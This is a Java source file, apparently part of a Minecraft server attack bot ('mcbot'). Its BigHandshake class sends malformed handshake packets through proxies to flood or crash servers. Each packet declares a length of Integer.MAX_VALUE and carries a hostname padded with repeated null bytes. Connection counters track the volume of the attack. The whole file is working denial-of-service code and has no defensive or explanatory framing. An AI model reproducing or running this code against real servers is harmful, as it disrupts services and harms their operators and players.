package xyz.mcbot.methods;

import io.netty.buffer.ByteBuf;
import io.netty.buffer.ByteBufOutputStream;
import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;
import java.io.IOException;
import xyz.mcbot.NettyBootstrap;
import xyz.mcbot.ProxyLoader.Proxy;



public class BigHandshake
  implements Method
{
  public BigHandshake() {}
  
  public static void writeVarInt(ByteBufOutputStream out, int paramInt)
    throws IOException
  {
    while ((paramInt & 0xFFFFFF80) != 0) {
      out.writeByte(paramInt & 0x7F | 0x80);
      paramInt >>>= 7;
    }
    out.writeByte(paramInt);
  }
  
  public void accept(Channel channel, ProxyLoader.Proxy proxy)
  {
    ByteBuf b = Unpooled.buffer();
    ByteBufOutputStream out = new ByteBufOutputStream(b);
    try {
      writeVarInt(out, Integer.MAX_VALUE);
      out.writeByte(9);
      out.writeBytes("localhost.\000a\000a\000a\000a\000a\000a\000a\000a\000a\000a\000a\000a\000a\000a\000a\000a\000a\000a\000a\000a\000a\000a\000a\000a\000a\000a\000a\000a\000a\000a\000a\000a\000a\000a\000a\000a\000a\000a\000a\000a\000a\000a\000a\000a\000a\000a\000a\000a\000a\000a\000a\000a\000a\000a\000a\000a\000a\000a\000a\000a\000a\000a\000a\000a\000a\000a\000a\000a\000a\000a\000a\000a\000a\000a\000a\000a\000a\000a\000a\000a\000a\000a\000a\000a\000a\000a\000a\000a\000a\000a\000a\000a\000a\000a\000a\000a\000a\000a\000a\000a\000a\000a\000a\000a\000a\000a\000a\000a\000a\000a\000a\000a\000a\000a\000a\000a\000a\000a\000a\000a\000a");
      out.writeShort(25565);
      writeVarInt(out, Integer.MAX_VALUE);
      out.close();
    }
    catch (IOException e) {
      e.printStackTrace();
    }
    channel.writeAndFlush(b);
    NettyBootstrap.integer += 1;
    NettyBootstrap.totalConnections += 1;
    channel.close();
  }
}
